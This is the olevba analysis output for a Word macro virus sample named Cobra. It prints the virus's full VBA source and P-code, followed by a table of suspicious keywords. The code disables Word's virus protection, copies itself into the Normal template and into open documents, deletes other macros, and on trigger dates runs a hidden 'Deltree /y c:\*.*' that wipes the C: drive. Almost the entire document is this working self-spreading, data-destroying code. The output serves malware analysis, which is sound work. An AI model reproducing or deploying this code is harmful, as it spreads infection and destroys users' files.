olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.v
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.v - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra.bas 
in file: Virus.MSWord.Cobra.v - OLE stream: 'Macros/VBA/Cobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 1.0C
Sub AutoOpen()
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    Call DelMac
    Call TempCopy
    Call ADocCopy
    Call DelCDrive
End Sub
Sub DelMac()
On Error Resume Next
Set NTmp = NormalTemplate
    Set ADoc = ActiveDocument
    For i = 1 To NTmp.VBProject.VBComponents.Count
      nm = NTmp.VBProject.VBComponents(i).Name
      If (nm <> "Cobra") And (nm <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NTmp.FullName, _
            Name:=nm, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
    For i = 1 To ADoc.VBProject.VBComponents.Count
        nm = ADoc.VBProject.VBComponents(i).Name
        If (nm <> "ThisDocument") And (nm <> "Cobra") And _
        (nm <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=ADoc.FullName, _
        Name:=nm, Object:=wdOrganizerObjectProjectItems
    End If
    Next i
End Sub
Private Sub TempCopy()
On Error Resume Next
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, Name:="Cobra", _
    Object:=wdOrganizerObjectProjectItems
    Templates(NormalTemplate.FullName).Save
End Sub
Private Sub ADocCopy()
On Error Resume Next
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="Cobra", _
    Object:=wdOrganizerObjectProjectItems
End Sub
Private Sub DelCDrive()
On Error Resume Next
    Dim DelOk As Boolean
For i = 1 To 10
If Day(Now) = i And Month(Now) = i Then
        If i <= 4 Then
            If Left(Application.UserName, 1) <= Chr(100) Then
            DelOk = True
            End If
        End If
    If i > 4 And i <= 8 Then
        If Left(Application.UserName, 1) > Chr(100) _
        And Left(Application.UserName, 1) <= Chr(200) Then
        DelOk = True
        End If
    End If
    If i > 8 And i <= 12 Then
        If Left(Application.UserName, 1) > Chr(200) _
        And Left(Application.UserName, 1) <= Chr(255) Then
        DelOk = True
        End If
    End If
End If
Next
    If DelOk = True Then
        Call DelDir
    End If
End Sub
Sub AutoClose()
On Error Resume Next
    TempCopy
    ADocCopy
    If ActiveDocument.Saved = False Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
    End Sub
Sub DelDir()
On Error Resume Next
    Dim MP, MN
    MP = "c:\"
    MN = Dir(MP, vbDirectory)
    Do While MN <> ""
        If MN <> "." And MN <> ".." Then
            If (GetAttr(MP & MN) And vbDirectory) = vbDirectory Then
                If UCase(Left(MN, 1)) = UCase(Left(Application.UserName, 1)) Then
                    Shell "Deltree /y c:\*.*", vbHide
                End If
            End If
        End If
            MN = Dir
    Loop
End Sub
Sub FileNew()
On Error Resume Next
    Call DelMac
    Call TempCopy
    Call ADocCopy
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
On Error Resume Next
    Call DelMac
    Call TempCopy
    Call ADocCopy
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cobra.v
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Cobra - 8273 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0012 "Cobra Version 1.0C"
' Line #1:
' 	FuncDefn (Sub AutoOpen())
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #5:
' 	ArgsCall (Call) DelMac 0x0000 
' Line #6:
' 	ArgsCall (Call) TempCopy 0x0000 
' Line #7:
' 	ArgsCall (Call) ADocCopy 0x0000 
' Line #8:
' 	ArgsCall (Call) DelCDrive 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Sub DelMac())
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NTmp 
' Line #13:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ADoc 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NTmp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld i 
' 	Ld NTmp 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nm 
' Line #16:
' 	Ld nm 
' 	LitStr 0x0005 "Cobra"
' 	Ne 
' 	Paren 
' 	Ld nm 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #17:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NTmp 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld nm 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ADoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #21:
' 	Ld i 
' 	Ld ADoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nm 
' Line #22:
' 	LineCont 0x0004 0D 00 08 00
' 	Ld nm 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	Ld nm 
' 	LitStr 0x0005 "Cobra"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nm 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #23:
' 	LineCont 0x0004 09 00 08 00
' 	Ld ADoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld nm 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Private Sub TempCopy())
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	LineCont 0x0008 09 00 04 00 13 00 04 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Cobra"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #30:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Private Sub ADocCopy())
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	LineCont 0x0008 09 00 04 00 13 00 04 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Cobra"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Private Sub DelCDrive())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	Dim 
' 	VarDefn DelOk (As Boolean)
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #40:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld i 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Ld i 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #41:
' 	Ld i 
' 	LitDI2 0x0004 
' 	Le 
' 	IfBlock 
' Line #42:
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Le 
' 	IfBlock 
' Line #43:
' 	LitVarSpecial (True)
' 	St DelOk 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld i 
' 	LitDI2 0x0004 
' 	Gt 
' 	Ld i 
' 	LitDI2 0x0008 
' 	Le 
' 	And 
' 	IfBlock 
' Line #47:
' 	LineCont 0x0004 0E 00 08 00
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Gt 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x00C8 
' 	ArgsLd Chr 0x0001 
' 	Le 
' 	And 
' 	IfBlock 
' Line #48:
' 	LitVarSpecial (True)
' 	St DelOk 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Ld i 
' 	LitDI2 0x0008 
' 	Gt 
' 	Ld i 
' 	LitDI2 0x000C 
' 	Le 
' 	And 
' 	IfBlock 
' Line #52:
' 	LineCont 0x0004 0E 00 08 00
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x00C8 
' 	ArgsLd Chr 0x0001 
' 	Gt 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr 0x0001 
' 	Le 
' 	And 
' 	IfBlock 
' Line #53:
' 	LitVarSpecial (True)
' 	St DelOk 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	Ld DelOk 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #59:
' 	ArgsCall (Call) DelDir 0x0000 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub AutoClose())
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	ArgsCall TempCopy 0x0000 
' Line #65:
' 	ArgsCall ADocCopy 0x0000 
' Line #66:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #67:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Sub DelDir())
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	Dim 
' 	VarDefn MP
' 	VarDefn MN
' Line #73:
' 	LitStr 0x0003 "c:\"
' 	St MP 
' Line #74:
' 	Ld MP 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St MN 
' Line #75:
' 	Ld MN 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #76:
' 	Ld MN 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Ld MN 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	And 
' 	IfBlock 
' Line #77:
' 	Ld MP 
' 	Ld MN 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #78:
' 	Ld MN 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #79:
' 	LitStr 0x0011 "Deltree /y c:\*.*"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	Ld Dir 
' 	St MN 
' Line #84:
' 	Loop 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub FileNew())
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	ArgsCall (Call) DelMac 0x0000 
' Line #89:
' 	ArgsCall (Call) TempCopy 0x0000 
' Line #90:
' 	ArgsCall (Call) ADocCopy 0x0000 
' Line #91:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub FileExit())
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	ArgsCall (Call) DelMac 0x0000 
' Line #96:
' 	ArgsCall (Call) TempCopy 0x0000 
' Line #97:
' 	ArgsCall (Call) ADocCopy 0x0000 
' Line #98:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

